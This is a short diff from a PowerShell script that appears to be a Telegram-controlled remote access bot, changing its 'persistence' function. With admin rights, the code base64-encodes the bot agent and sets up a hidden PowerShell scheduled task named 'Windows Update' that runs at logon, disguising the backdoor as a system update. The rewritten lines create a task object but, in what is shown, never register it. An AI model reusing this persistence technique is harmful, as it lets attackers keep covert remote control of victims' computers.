@@ -188,7 +188,9 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; 
-.\schtasks.exe  /create /tn "Windows Update" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code"  /sc onlogon
+$accion = New-ScheduledTaskAction -Execute 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument '-win hidden -enc $code'
+$desencadenante = New-ScheduledTaskTrigger -Daily -AtLogOn
+$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet)
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
